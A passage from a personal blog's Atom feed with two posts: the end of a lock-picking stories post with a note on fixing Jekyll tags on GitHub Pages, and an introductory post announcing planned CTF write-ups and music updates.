&lt;p&gt;I didn‚Äôt know what to do for my first blog, so I hope that was at least somewhat entertaining. I have tons of lock picking related stories, these were just a few. I just didn‚Äôt want this blog to become boring filled with just CTF stuff. I‚Äôm going to try doing one writeup and one like random research/adventures post each week. Also tags don‚Äôt work on github pages so if the url is &lt;a href=&quot;https://jambot3000.github.io&quot;&gt;https://jambot3000.github.io&lt;/a&gt; then uhh this site is different to the real one. If anyone knows how to get that working, please dm me. Thanks for reading!&lt;/p&gt;

&lt;p&gt;Edit: I actually ended up getting tags working by having 1 repo for the whole jekyll project, and another for just the contents of &lt;code class=&quot;highlighter-rouge&quot;&gt;_site&lt;/code&gt;(this is the one used by github pages). Because it‚Äôs all static content, just raw HTML and CSS, github doesn‚Äôt scream at you for trying to use a jekyll plugin, because you aren‚Äôt using one.&lt;/p&gt;</content><author><name>JamBot</name></author><category term="locks" /><summary type="html">In the beginning</summary></entry><entry><title type="html">what is this?</title><link href="http://localhost:4000/blog/what-is-this" rel="alternate" type="text/html" title="what is this?" /><published>2020-10-02T00:00:00+01:00</published><updated>2020-10-02T00:00:00+01:00</updated><id>http://localhost:4000/blog/what</id><content type="html" xml:base="http://localhost:4000/blog/what-is-this">&lt;p&gt;Epic okay. So, I decided to make a blog for myself.&lt;/p&gt;

&lt;p&gt;By this time next year I hope to have around 50 CTF/Tech relates blog posts. I figured that if I‚Äôm doing a lot of tech related stuff, both for fun and in the hopes of getting a career in the field, then I might aswell have something to show for it :)&lt;/p&gt;

&lt;p&gt;I‚Äôll probably put mainly &lt;a href=&quot;https://tryhackme.com&quot;&gt;THM&lt;/a&gt; and &lt;a href=&quot;https://hackthebox.eu&quot;&gt;HTB&lt;/a&gt; writeups on here, for HTB obviously only retired machine writeups will be posted. I expect it to be more THM though, as on the free tier there is more variety of exploits/techniques to document, talk about, and discover. HTB definitely has a lot to offer but a large amount of that is with VIP, which I will be buying occasionally to do retired machines :)&lt;/p&gt;

&lt;p&gt;As for music stuff there is going to be 0 consistancy. I constantly am in multiple bands, with varying different styles, random breaks etc etc. But anything cool that happens, I‚Äôll be sure to put on here :)&lt;/p&gt;

&lt;p&gt;The site was made with Jekyll, and the awesome theme used is viewable on every page on the bottom left :)&lt;/p&gt;</content><author><name>JamBot</name></author><category term="misc" /><summary type="html">Epic okay. So, I decided to make a blog for myself.</summary></entry></feed>